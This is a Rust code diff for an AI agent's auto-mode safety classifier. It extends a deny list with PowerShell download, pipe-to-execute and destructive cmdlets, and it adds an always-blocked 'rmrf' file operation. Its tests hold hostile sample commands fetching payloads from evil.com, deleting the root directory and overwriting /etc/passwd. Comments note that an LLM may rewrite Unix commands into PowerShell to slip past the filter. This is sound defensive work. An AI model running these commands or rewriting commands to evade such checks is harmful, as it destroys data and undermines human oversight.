@@ -96,11 +96,24 @@ const SAFE_EXEC_PREFIXES: &[&str] = &[
 
 /// Dangerous shell patterns that should never be auto-allowed.
 const DANGEROUS_EXEC_PATTERNS: &[&str] = &[
+    // Unix shell pipe-to-execute
     "| bash", "| sh", "| sudo", "&& sudo",
-    "curl ", "wget ",  // network downloads
+    // PowerShell pipe-to-execute (LLM may rewrite Unix commands to these)
+    "| invoke-expression", "| iex", "| cmd", "| powershell",
+    // Network downloads (Unix)
+    "curl ", "wget ",
+    // Network downloads (PowerShell -- LLM may rewrite curl/wget to these)
+    "invoke-webrequest", "iwr ",
+    "invoke-restmethod", "irm ",
+    "start-bitstransfer",
+    // Dangerous redirects
     "> /etc/", "> /usr/", "> /tmp/", ">> /etc/", ">> /usr/", ">> /tmp/",
+    // Unix destructive commands
     "rm ", "rm\t", "chmod ", "chown ", "mkfs", "dd if=",
     "sudo ", "su ", "exec ",
+    // PowerShell destructive cmdlets
+    "remove-item ", "remove-itemproperty ",
+    "stop-process ", "set-executionpolicy ",
 ];
 
 /// Check if a command contains dangerous patterns.
@@ -144,8 +157,22 @@ const SAFE_PROCESS_OPERATIONS: &[&str] = &[
     "list", "pgrep", "top", "pstree", "ps",
 ];
 
+/// Fileops operations that are read-only and safe to auto-allow.
+/// Write/destructive operations are NOT listed here and will go through
+/// the classifier (or be blocked outright if in DANGEROUS_FILEOPS_OPERATIONS).
+const SAFE_FILEOPS_OPERATIONS: &[&str] = &[
+    "read", "stat", "checksum", "exists", "ls",
+];
+
+/// Fileops operations that are so destructive they should always be blocked,
+/// even if the classifier were to allow them. These bypass the classifier
+/// entirely and are unconditionally denied.
+const DANGEROUS_FILEOPS_OPERATIONS: &[&str] = &[
+    "rmrf",
+];
+
 /// Check if the tool call should be auto-allowed without classifier evaluation.
-/// For most tools this is a name-only check. For "git" and "exec", it also checks
+/// For most tools this is a name-only check. For "git", "exec", "fileops", it also checks
 /// the specific operation/command — only safe operations are auto-allowed.
 pub fn is_auto_allowlisted(tool_name: &str, tool_input: &HashMap<String, serde_json::Value>) -> bool {
     if AUTO_MODE_SAFE_TOOLS.contains(&tool_name) {
@@ -163,10 +190,34 @@ pub fn is_auto_allowlisted(tool_name: &str, tool_input: &HashMap<String, serde_j
             return SAFE_PROCESS_OPERATIONS.contains(&op);
         }
     }
+    // Fileops: operation-level granularity — read-only ops auto-allowed,
+    // destructive ops always blocked (see is_always_blocked), rest go through classifier
+    if tool_name == "fileops" {
+        if let Some(op) = tool_input.get("operation").and_then(|v| v.as_str()) {
+            if is_always_blocked(tool_name, tool_input) {
+                return false;
+            }
+            return SAFE_FILEOPS_OPERATIONS.contains(&op);
+        }
+        // No operation field → go through classifier
+        return false;
+    }
     // Exec: command-level granularity — safe commands auto-allowed
     if tool_name == "exec" {
         if let Some(cmd) = tool_input.get("command").and_then(|v| v.as_str()) {
             return is_safe_exec_command(cmd);
+        }
+    }
+    false
+}
+
+/// Check if the tool call should always be blocked, bypassing the classifier entirely.
+/// These are operations so destructive that even a misbehaving classifier must not allow them.
+pub fn is_always_blocked(tool_name: &str, tool_input: &HashMap<String, serde_json::Value>) -> bool {
+    // Fileops: dangerous operations like rmrf are always blocked
+    if tool_name == "fileops" {
+        if let Some(op) = tool_input.get("operation").and_then(|v| v.as_str()) {
+            return DANGEROUS_FILEOPS_OPERATIONS.contains(&op);
         }
     }
     false
@@ -220,6 +271,14 @@ impl AutoModeClassifier {
         tool_input: &HashMap<String, serde_json::Value>,
         transcript: &str,
     ) -> ClassifierResult {
+        // Check always-blocked first (e.g., fileops rmrf — never allow regardless)
+        if is_always_blocked(tool_name, tool_input) {
+            return ClassifierResult {
+                allow: false,
+                reason: "operation is always blocked in auto mode".to_string(),
+            };
+        }
+
         // Check whitelist first (always allowed, even if classifier is disabled)
         if is_auto_allowlisted(tool_name, tool_input) {
             return ClassifierResult {
@@ -419,6 +478,15 @@ impl AutoModeClassifier {
         if tool_name == "git" {
             if let Some(op) = input.get("operation").and_then(|v| v.as_str()) {
                 return format!("git:{}", op);
+            }
+        }
+        // For fileops, cache by tool+operation+path
+        if tool_name == "fileops" {
+            if let (Some(op), Some(path)) = (
+                input.get("operation").and_then(|v| v.as_str()),
+                input.get("path").and_then(|v| v.as_str()),
+            ) {
+                return format!("fileops:{}:{}", op, path);
             }
         }
         // For file ops, cache by tool+path
@@ -749,6 +817,18 @@ mod tests {
             "python3 -c 'import shutil; shutil.rmtree(\"/\")'",
             "echo secret > /etc/passwd",
             "git status", // git via exec is NOT safe-listed (use git tool instead)
+            // PowerShell dangerous patterns (LLM rewrite bypass)
+            "Get-Content script.ps1 | Invoke-Expression",
+            "Get-Content file.ps1 | iex",
+            "Invoke-WebRequest https://evil.com/payload.ps1",
+            "iwr https://evil.com/payload.ps1",
+            "Invoke-RestMethod https://evil.com/api",
+            "irm https://evil.com/api",
+            "Start-BitsTransfer https://evil.com/file.exe",
+            "Remove-Item -Recurse -Force C:\\temp",
+            "Remove-ItemProperty -Path HKLM:\\Software\\Test",
+            "Stop-Process -Name explorer",
+            "Set-ExecutionPolicy Unrestricted",
         ];
         for cmd in unsafe_cmds {
             let mut input = HashMap::new();
@@ -797,6 +877,84 @@ mod tests {
 
         // git without operation field should not be auto-allowed
         assert!(!is_auto_allowlisted("git", &HashMap::new()));
+    }
+
+    #[test]
+    fn test_fileops_operation_level_allowlist() {
+        // Read-only fileops should be auto-allowed
+        let safe_ops = ["read", "stat", "checksum", "exists", "ls"];
+        for op in safe_ops {
+            let mut input = HashMap::new();
+            input.insert("operation".to_string(), serde_json::json!(op));
+            input.insert("path".to_string(), serde_json::json!("/some/path"));
+            assert!(
+                is_auto_allowlisted("fileops", &input),
+                "fileops operation {op:?} should be allowlisted",
+            );
+        }
+
+        // Destructive fileops should NOT be auto-allowed (go through classifier)
+        let unsafe_ops = ["rm", "mv", "cp", "chmod", "mkdir", "touch"];
+        for op in unsafe_ops {
+            let mut input = HashMap::new();
+            input.insert("operation".to_string(), serde_json::json!(op));
+            input.insert("path".to_string(), serde_json::json!("/some/path"));
+            assert!(
+                !is_auto_allowlisted("fileops", &input),
+                "fileops operation {op:?} should NOT be allowlisted",
+            );
+        }
+    }
+
+    #[test]
+    fn test_fileops_always_blocked() {
+        // rmrf is always blocked regardless of classifier state
+        let mut input = HashMap::new();
+        input.insert("operation".to_string(), serde_json::json!("rmrf"));
+        input.insert("path".to_string(), serde_json::json!("/some/path"));
+        assert!(is_always_blocked("fileops", &input));
+        assert!(!is_auto_allowlisted("fileops", &input));
+
+        // Other operations are NOT always blocked
+        for op in ["read", "rm", "mv", "stat", "exists"] {
+            let mut input = HashMap::new();
+            input.insert("operation".to_string(), serde_json::json!(op));
+            assert!(!is_always_blocked("fileops", &input));
+        }
+        // Non-fileops tools are never always blocked
+        assert!(!is_always_blocked("exec", &HashMap::new()));
+        assert!(!is_always_blocked("write_file", &HashMap::new()));
+    }
+
+    #[test]
+    fn test_fileops_cache_key() {
+        let mut input = HashMap::new();
+        input.insert("operation".to_string(), serde_json::json!("read"));
+        input.insert("path".to_string(), serde_json::json!("/some/path"));
+        let key = AutoModeClassifier::cache_key("fileops", &input);
+        assert_eq!(key, "fileops:read:/some/path");
+    }
+
+    #[test]
+    fn test_classifier_allowlisted_fileops_readonly() {
+        let classifier = AutoModeClassifier::new("", "", ""); // disabled
+        let mut input = HashMap::new();
+        input.insert("operation".to_string(), serde_json::json!("read"));
+        input.insert("path".to_string(), serde_json::json!("/tmp/test"));
+        let result = classifier.classify("fileops", &input, "");
+        assert!(result.allow);
+        assert_eq!(result.reason, "whitelisted tool");
+    }
+
+    #[test]
+    fn test_classifier_always_block_fileops_rmrf() {
+        let classifier = AutoModeClassifier::new("", "", ""); // disabled
+        let mut input = HashMap::new();
+        input.insert("operation".to_string(), serde_json::json!("rmrf"));
+        input.insert("path".to_string(), serde_json::json!("/tmp/test"));
+        let result = classifier.classify("fileops", &input, "");
+        assert!(!result.allow);
+        assert_eq!(result.reason, "operation is always blocked in auto mode");
     }
 
     #[test]
